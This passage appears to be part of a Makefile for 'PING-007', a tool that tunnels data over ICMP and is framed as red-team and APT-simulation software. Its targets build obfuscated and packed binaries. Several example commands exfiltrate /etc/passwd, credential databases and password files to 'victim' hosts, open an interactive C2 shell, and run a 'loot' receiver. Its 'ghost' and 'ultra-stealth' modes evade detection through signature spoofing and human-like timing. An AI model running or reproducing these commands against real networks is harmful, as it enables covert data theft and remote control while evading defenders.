		--output $(if $(OUTPUT),$(OUTPUT),./received) \
		--method $(if $(METHOD),$(METHOD),icmp_tunnel) \
		--timeout $(if $(TIMEOUT),$(TIMEOUT),60) \
		$(if $(PASSWORD),--password "$(PASSWORD)",)

analyze: build ## Network analysis mode
	@echo "$(CYAN)Network Analysis$(RESET)"
	@sudo $(BUILD_DIR)/$(BINARY_NAME) analyze --duration $(if $(DURATION),$(DURATION),60)

# Obfuscation Tools

install-garble: ## Install Garble obfuscation tool
	@echo "$(CYAN) Installing Garble obfuscation tool...$(RESET)"
	@if ! command -v garble >/dev/null 2>&1; then \
		echo "$(BLUE)Installing Garble...$(RESET)"; \
		go install mvdan.cc/garble@latest; \
		echo "$(GREEN)Garble installed$(RESET)"; \
	else \
		echo "$(GREEN)Garble already installed$(RESET)"; \
	fi

# Installation Management

install-deps: ## Install all optional dependencies (UPX, security tools)
	@echo "$(CYAN)Installing Optional Dependencies...$(RESET)"
	@echo "$(BLUE)Installing UPX compression tool...$(RESET)"
	@if ! command -v upx >/dev/null 2>&1; then \
		if command -v apt-get >/dev/null 2>&1; then \
			sudo apt-get update && sudo apt-get install -y upx-ucl; \
		elif command -v yum >/dev/null 2>&1; then \
			sudo yum install -y upx; \
		elif command -v brew >/dev/null 2>&1; then \
			brew install upx; \
		else \
			echo "$(RED) Please install UPX manually$(RESET)"; \
		fi; \
	else \
		echo "$(GREEN)UPX already installed$(RESET)"; \
	fi
	@echo "$(BLUE)Installing security analysis tools...$(RESET)"
	@if command -v apt-get >/dev/null 2>&1; then \
		sudo apt-get install -y binutils file strings xxd hexdump; \
	elif command -v yum >/dev/null 2>&1; then \
		sudo yum install -y binutils file; \
	fi
	@echo "$(GREEN)Optional dependencies installed$(RESET)"

install-optional: install-deps ## Alias for install-deps

install-upx: ## Install UPX compression tool only
	@echo "$(CYAN)Installing UPX...$(RESET)"
	@if ! command -v upx >/dev/null 2>&1; then \
		if command -v apt-get >/dev/null 2>&1; then \
			sudo apt-get update && sudo apt-get install -y upx-ucl; \
		elif command -v yum >/dev/null 2>&1; then \
			sudo yum install -y upx; \
		elif command -v brew >/dev/null 2>&1; then \
			brew install upx; \
		else \
			echo "$(RED) Please install UPX manually: https://upx.github.io/$(RESET)"; \
			exit 1; \
		fi; \
	else \
		echo "$(GREEN)UPX already installed$(RESET)"; \
	fi

# Framework Management Shortcuts

go-setup: ## Install Go and development tools
	@echo "$(CYAN)🛠️  Setting up Go environment...$(RESET)"
	@if ! command -v go >/dev/null 2>&1; then \
		echo "$(BLUE)Installing Go...$(RESET)"; \
		if command -v apt-get >/dev/null 2>&1; then \
			sudo apt-get update && sudo apt-get install -y golang-go; \
		elif command -v yum >/dev/null 2>&1; then \
			sudo yum install -y go; \
		elif command -v brew >/dev/null 2>&1; then \
			brew install go; \
		else \
			echo "$(RED) Please install Go manually: https://golang.org/dl/$(RESET)"; \
			exit 1; \
		fi; \
	fi
	@echo "$(GREEN)Go installed: $$(go version)$(RESET)"
	@make setup

# Example Operations

examples: ## Show usage examples
	@echo "$(CYAN)PING-007 Framework Examples$(RESET)"
	@echo "$(WHITE)═══════════════════════════════════════$(RESET)"
	@echo ""
	@echo "$(YELLOW)Setup and Build:$(RESET)"
	@echo "  $(GREEN)make go-setup$(RESET)                    # Install Go and setup environment"
	@echo "  $(GREEN)make build$(RESET)                       # Standard build"
	@echo "  $(GREEN)make build-stealth$(RESET)               # Build with obfuscation (Garble)"
	@echo "  $(GREEN)make build-ghost$(RESET)                 # Maximum obfuscation + stripped"
	@echo "  $(GREEN)make build-compressed$(RESET)            # UPX compressed binary"
	@echo "  $(GREEN)make build-armored$(RESET)               # Obfuscated + compressed (best stealth)"
	@echo "  $(GREEN)make install$(RESET)                     # Install to system PATH"
	@echo ""
	@echo "$(YELLOW)Basic Operations (Military-Grade Crypto):$(RESET)"
	@echo "  $(GREEN)make status$(RESET)                      # Framework health check"
	@echo "  $(GREEN)make basic TARGET=192.168.1.100 PASSWORD='secret123'$(RESET) # AES-256-GCM + PBKDF2"
	@echo "  $(GREEN)make basic TARGET=10.0.1.50 PASSWORD='ops2024' DATA='classified'$(RESET) # With AAD binding"
	@echo "  $(GREEN)make basic TARGET=victim.net PASSWORD='red-team' SIGNATURE='none'$(RESET) # Raw ICMP (no OS imitation)"
	@echo ""
	@echo "$(YELLOW)Stealth Operations:$(RESET)"
	@echo "  $(GREEN)make stealth TARGET=192.168.1.100$(RESET)"
	@echo "  $(GREEN)make stealth TARGET=target.com DATA='covert data'$(RESET)"
	@echo "  $(GREEN)make stealth TARGET=victim.local PASSWORD='redteam2024' DATA='exfil payload'$(RESET)"
	@echo ""
	@echo "$(YELLOW)Data Exfiltration:$(RESET)"
	@echo "  $(GREEN)make exfil TARGET=192.168.1.100 FILE=data.txt$(RESET)"
	@echo "  $(GREEN)make exfil TARGET=10.0.1.50 FILE=secret.zip METHOD=icmp_payload MODE=covert$(RESET)"
	@echo "  $(GREEN)make exfil TARGET=victim.com FILE=passwords.txt CHUNK_SIZE=256 NO_STEALTH=1$(RESET)"
	@echo "  $(GREEN)make exfil TARGET=192.168.1.100 FILE=credentials.db PASSWORD='OpSec2024!'$(RESET)"
	@echo ""
	@echo "$(YELLOW)APT Simulation:$(RESET)"
	@echo "  $(GREEN)make apt TARGET=testlab.local PROFILE=lazarus$(RESET)"
	@echo "  $(GREEN)make apt TARGET=192.168.1.100 PROFILE=apt29 DURATION=600$(RESET)"
	@echo "  $(GREEN)make apt TARGET=victim.com PROFILE=equation DURATION=3600$(RESET)"
	@echo ""
	@echo "$(YELLOW)Interactive Operations:$(RESET)"
	@echo "  $(GREEN)make shell TARGET=192.168.1.100$(RESET)         # Interactive C2 shell"
	@echo "  $(GREEN)make shell TARGET=192.168.1.100 PASSWORD='c2key123'$(RESET)  # Encrypted C2 shell"
	@echo "  $(GREEN)make listen OUTPUT=./loot TIMEOUT=300$(RESET)   # Data receiver"
	@echo "  $(GREEN)make listen OUTPUT=./decrypted PASSWORD='c2key123'$(RESET)   # Encrypted receiver"
	@echo "  $(GREEN)make analyze DURATION=180$(RESET)               # Traffic analysis"
	@echo ""
	@echo "$(YELLOW)Available APT Profiles:$(RESET)"
	@echo "  • $(BLUE)lazarus$(RESET)  - Lazarus Group (North Korea) - 5min-1hr timing"
	@echo "  • $(BLUE)apt29$(RESET)    - Cozy Bear (Russia) - 30min-2hr timing"
	@echo "  • $(BLUE)apt28$(RESET)    - Fancy Bear (Russia) - 10min-30min timing"
	@echo "  • $(BLUE)equation$(RESET) - Equation Group (NSA) - 1day-3day timing"
	@echo ""
	@echo "$(YELLOW)Development:$(RESET)"
	@echo "  $(GREEN)make test$(RESET)                        # Run test suite"
	@echo "  $(GREEN)make lint$(RESET)                        # Code quality checks"
	@echo "  $(GREEN)make security-check$(RESET)              # Security analysis"
	@echo "  $(GREEN)make demo$(RESET)                        # Full demonstration"

# Red Team Scenarios

redteam-examples: ## Red team operation examples
	@echo "$(CYAN)🔴 Red Team Operation Examples$(RESET)"
	@echo "$(WHITE)═══════════════════════════════════════$(RESET)"
	@echo ""
	@echo "$(YELLOW)Data Extraction Scenarios:$(RESET)"
	@echo "  $(GREEN)make exfil TARGET=victim.corp FILE=/etc/passwd METHOD=icmp_timing$(RESET)"
	@echo "  $(GREEN)make exfil TARGET=10.0.2.15 FILE=database_dump.sql MODE=covert$(RESET)"
	@echo "  $(GREEN)make exfil TARGET=target.com FILE=credentials.zip CHUNK_SIZE=128$(RESET)"
	@echo ""
	@echo "$(YELLOW)C2 Operations:$(RESET)"
	@echo "  $(GREEN)make shell TARGET=compromised.host$(RESET)"
	@echo "  $(GREEN)make listen OUTPUT=/tmp/c2_data TIMEOUT=3600$(RESET)"
	@echo ""
	@echo "$(YELLOW)APT Simulation for Testing:$(RESET)"
	@echo "  $(GREEN)make apt TARGET=production.net PROFILE=lazarus DURATION=1800$(RESET)"

# Blue Team Scenarios

blueteam-examples: ## Blue team testing examples
	@echo "$(CYAN)🔵 Blue Team Testing Examples$(RESET)"
	@echo "$(WHITE)═══════════════════════════════════════$(RESET)"
	@echo ""
	@echo "$(YELLOW)Detection Testing:$(RESET)"
	@echo "  $(GREEN)make stealth TARGET=honeypot.lab$(RESET)"
	@echo "  $(GREEN)make apt TARGET=testnet.local PROFILE=apt29 DURATION=300$(RESET)"
	@echo ""
	@echo "$(YELLOW)Traffic Analysis:$(RESET)"
	@echo "  $(GREEN)make analyze DURATION=600$(RESET)"
	@echo "  $(GREEN)make listen INTERFACE=eth0 TIMEOUT=1800$(RESET)"

# Cryptographic Security Testing
crypto-tests: build ## Run comprehensive cryptographic security tests
	@echo "$(CYAN)🔐 Comprehensive Cryptographic Security Validation$(RESET)"
	@echo "$(WHITE)═══════════════════════════════════════════════════════$(RESET)"
	@echo ""
	@echo "$(BLUE)Running all cryptographic security tests...$(RESET)"
	@echo ""
	@echo "$(YELLOW)Test 1: Shared Password System (Bidirectional Crypto)$(RESET)"
	@if [ -f "./test_shared_password.sh" ]; then \
		sudo ./test_shared_password.sh; \
	else \
		echo "$(RED)test_shared_password.sh not found$(RESET)"; \
	fi
	@echo ""
	@echo "$(YELLOW)Test 2: Custom XOR Security (PBKDF2 + XOR-CFB-HMAC)$(RESET)"
	@if [ -f "./test_custom_xor_security.sh" ]; then \
		sudo ./test_custom_xor_security.sh; \
	else \
		echo "$(RED)test_custom_xor_security.sh not found$(RESET)"; \
	fi
	@echo ""
	@echo "$(YELLOW)Test 3: AAD Implementation (Context Binding)$(RESET)"
	@if [ -f "./test_aad_security.sh" ]; then \
		sudo ./test_aad_security.sh; \
	else \
		echo "$(RED)test_aad_security.sh not found$(RESET)"; \
	fi
	@echo ""
	@echo "$(YELLOW)Test 4: Secure Algorithm Rotation$(RESET)"
	@if [ -f "./test_secure_rotation.sh" ]; then \
		sudo ./test_secure_rotation.sh; \
	else \
		echo "$(RED)test_secure_rotation.sh not found$(RESET)"; \
	fi
	@echo ""
	@echo "$(YELLOW)Test 5: Final Cryptographic Perfection$(RESET)"
	@if [ -f "./test_final_crypto_perfection.sh" ]; then \
		sudo ./test_final_crypto_perfection.sh; \
	else \
		echo "$(RED)test_final_crypto_perfection.sh not found$(RESET)"; \
	fi
	@echo ""
	@echo "$(GREEN)🎉 Cryptographic validation complete!$(RESET)"
	@echo "$(YELLOW)📊 Security Status: Military-Grade Encryption Verified$(RESET)"

crypto-demo: build ## Demonstrate cryptographic capabilities
	@echo "$(CYAN)🔐 Cryptographic Capabilities Demonstration$(RESET)"
	@echo "$(WHITE)══════════════════════════════════════════════$(RESET)"
	@echo ""
	@echo "$(YELLOW)Demonstration of ping-007 military-grade cryptographic features:$(RESET)"
	@echo ""
	@echo "$(BLUE)1. Bidirectional Encryption with Shared Password$(RESET)"
	@echo "$(GREEN)   • AES-256-GCM with PBKDF2 key derivation$(RESET)"
	@echo "$(GREEN)   • ChaCha20-Poly1305 alternative algorithm$(RESET)"
	@echo "$(GREEN)   • XOR-CFB-HMAC enhanced implementation$(RESET)"
	@echo ""
	@echo "$(BLUE)2. Advanced Security Features$(RESET)"
	@echo "$(GREEN)   • Contextual AAD binding (IP, session, sequence)$(RESET)"
	@echo "$(GREEN)   • Cryptographically secure algorithm rotation$(RESET)"
	@echo "$(GREEN)   • Algorithm auto-detection with 4-byte headers$(RESET)"
	@echo "$(GREEN)   • Collision-resistant hybrid nonces$(RESET)"
	@echo "$(GREEN)   • Secure memory management with key zeroing$(RESET)"
	@echo ""
	@echo "$(BLUE)3. Test Bidirectional Communication$(RESET)"
	@echo "$(YELLOW)Starting encrypted listener (password: demo123)...$(RESET)"
	@sudo $(BUILD_DIR)/$(BINARY_NAME) listen --output ./crypto-demo --timeout 15 --password "demo123" &
	@sleep 2
	@echo "$(YELLOW)Sending encrypted message...$(RESET)"
	@sudo $(BUILD_DIR)/$(BINARY_NAME) basic --target 127.0.0.1 --password "demo123" --data "Cryptographic validation: AES-256-GCM + AAD + PBKDF2"
	@sleep 3
	@pkill -f "ping-007 listen" 2>/dev/null || true
	@echo ""
	@echo "$(GREEN)✅ Cryptographic demonstration complete$(RESET)"
	@echo "$(BLUE)📁 Check ./crypto-demo/ for decrypted received data$(RESET)"
	@rm -rf ./crypto-demo 2>/dev/null || true

ultra-stealth: build ## Ultra-stealth mode with maximum evasion
	@echo "$(CYAN)🕴️  Ultra-Stealth Mode with Advanced Evasion$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make ultra-stealth TARGET=192.168.1.100 PASSWORD='stealth-ops'$(RESET)"; \
		echo "$(YELLOW) 🕴️  Features: Human timing + Signature rotation + Maximum OPSEC$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)⚠️  Ultra-stealth requires password for encryption$(RESET)"; \
		echo "$(BLUE)💡 Recommended: PASSWORD='ultra-$(shell date +%Y%m%d)'$(RESET)"; \
		exit 1; \
	fi; \
	echo "$(GREEN)🕴️  Activating ultra-stealth evasion techniques:$(RESET)"; \
	echo "$(GREEN)   • Human-like timing simulation (1-5s random delays)$(RESET)"; \
	echo "$(GREEN)   • Signature rotation between Linux/Windows$(RESET)"; \
	echo "$(GREEN)   • Maximum cryptographic protection$(RESET)"; \
	echo "$(GREEN)   • Anti-detection patterns$(RESET)"; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) basic --target $(TARGET) --data "$(if $(DATA),$(DATA),Covert transmission)" --password "$(PASSWORD)" --ultra-stealth

ghost-mode: build ## Ghost mode - Near-undetectable transmission
	@echo "$(CYAN)👻 Ghost Mode - Maximum Evasion$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make ghost-mode TARGET=192.168.1.100 PASSWORD='ghost-ops'$(RESET)"; \
		echo "$(YELLOW) 👻 Features: 10-30s delays + Windows signature + Pattern obfuscation$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)⚠️  Ghost mode requires password$(RESET)"; \
		echo "$(BLUE)💡 Auto-generating ghost password...$(RESET)"; \
		PASSWORD="ghost-$(shell date +%s)"; \
		echo "$(BLUE)🔑 Generated password: $$PASSWORD$(RESET)"; \
	fi; \
	echo "$(GREEN)👻 Ghost mode evasion active:$(RESET)"; \
	echo "$(GREEN)   • Extended delays (10-30 seconds)$(RESET)"; \
	echo "$(GREEN)   • Windows signature (less monitored)$(RESET)"; \
	echo "$(GREEN)   • Minimal footprint$(RESET)"; \
	GHOST_DELAY=$$(echo $$(($$RANDOM % 20 + 10)))s; \
	echo "$(BLUE)⏰ Ghost delay: $$GHOST_DELAY$(RESET)"; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) basic --target $(TARGET) --data "$(if $(DATA),$(DATA),Ghost transmission)" --password "$(if $(PASSWORD),$(PASSWORD),ghost-$(shell date +%s))" --signature windows --delay "$$GHOST_DELAY" --stealth

human-mimic: build ## Human-like behavior simulation
	@echo "$(CYAN)🕴️  Human Behavior Mimicry$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make human-mimic TARGET=192.168.1.100 PASSWORD='human-test'$(RESET)"; \
		echo "$(YELLOW) 🕴️  Simulates realistic human ping testing behavior$(RESET)"; \
		exit 1; \
	fi; \
	echo "$(GREEN)🕴️  Simulating human network testing behavior:$(RESET)"; \
	echo "$(GREEN)   • Random 1-5 second intervals$(RESET)"; \
	echo "$(GREEN)   • Realistic data sizes and patterns$(RESET)"; \
	echo "$(GREEN)   • Natural pause variations$(RESET)"; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) basic --target $(TARGET) --data "$(if $(DATA),$(DATA),Network connectivity test)" --password "$(if $(PASSWORD),$(PASSWORD),)" --human-timing

natural-test: build ## Natural ping test simulation (like human doing ping -c N)
	@echo "$(CYAN)🕴️  Natural Ping Test Simulation$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make natural-test TARGET=192.168.1.100 COUNT=10 PASSWORD='test123'$(RESET)"; \
		echo "$(YELLOW) 🕴️  Simulates: Human doing 'ping -c N' with natural timing$(RESET)"; \
		exit 1; \
	fi; \
	COUNT=$(if $(COUNT),$(COUNT),10); \
	echo "$(GREEN)🕴️  Simulating natural ping test sequence:$(RESET)"; \
	echo "$(GREEN)   • Count: $$COUNT pings$(RESET)"; \
	echo "$(GREEN)   • Timing: Human-like intervals (1-5s + occasional pauses)$(RESET)"; \
	echo "$(GREEN)   • Pattern: Realistic connectivity testing$(RESET)"; \
	for i in $$(seq 1 $$COUNT); do \
		echo "$(BLUE)📡 Ping $$i/$$COUNT...$(RESET)"; \
		sudo $(BUILD_DIR)/$(BINARY_NAME) basic --target $(TARGET) --data "Connectivity test $$i/$$COUNT" --password "$(if $(PASSWORD),$(PASSWORD),)" --human-timing; \
		if [ $$i -lt $$COUNT ]; then \
			if [ $$(($$i % 5)) -eq 0 ]; then \
				echo "$(YELLOW)⏸️  Natural pause (user checking results)...$(RESET)"; \
				sleep $$(($$RANDOM % 10 + 5)); \
			fi; \
		fi; \
	done; \
	echo "$(GREEN)✅ Natural ping test sequence completed$(RESET)"

# CI/CD helper target
ci: clean deps lint test crypto-tests security-check build-all
	@echo "$(GREEN)CI pipeline with cryptographic validation completed successfully$(RESET)"